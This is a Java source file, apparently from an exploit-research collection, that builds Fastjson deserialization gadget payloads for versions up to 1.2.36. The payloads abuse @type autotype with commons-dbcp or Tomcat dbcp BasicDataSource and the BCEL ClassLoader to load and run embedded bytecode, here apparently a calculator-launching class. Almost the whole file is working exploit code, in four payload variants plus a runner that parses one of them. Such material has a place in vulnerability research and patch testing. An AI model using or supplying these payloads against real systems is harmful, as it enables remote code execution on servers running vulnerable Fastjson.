package com.yyjccc.fastjson.exp.low;

import com.alibaba.fastjson.JSON;
import com.yyjccc.javassist.Calc;

import static com.yyjccc.fastjson.exp.BcelUtil.bcelEncode;

/**
 * 版本： Fastjson <=1.2.36版本 <br/>
 * 条件：  commons-dbcp依赖,或者是tomcat-dbcp依赖<br/>
 * jdk:  低于jdk8u251  <br/>
 * 描述： 利用fastjson打BCEL字节码加载
 */

public class BcelCodeLoadGadget {



	public static void main(String[] args) {



		String BCELCode=bcelEncode(Calc.getCodeByte());
		String data=TomcatGadgetHigh(BCELCode);
		//JSON.parseObject(data);
		JSON.parse(data);
	}


	public static String commonGadget(String BCELCode){
		String data="{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\n\"driverClassName\":\""+BCELCode+"\",\n\"driverClassLoader\":{\n\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n}\n}";
		System.out.println(data);
		return data;
	}

	public static String TomcatGadgetHigh(String BCELCode){
		String data="{\n\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n\"driverClassName\":\""+BCELCode+"\",\n\"driverClassLoader\":{\n\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n}\n}";
		System.out.println(data);
		return data;
	}
	public static String TomcatGadgetLow(String BCELCode){
		String data="{\n\"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n\"driverClassName\":\""+BCELCode+"\",\n\"driverClassLoader\":{\n\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n}\n}";
		System.out.println(data);
		return data;
	}

	public static String ParsePayload(String BCELCode){
		String data="{\n{\n\"x\":{\n\"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n\"driverClassLoader\": {\n\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n},\n\"driverClassName\": \""+BCELCode+"\"\n}\n}: \"x\"\n}";
		System.out.println(data);
		return data;
	}
}
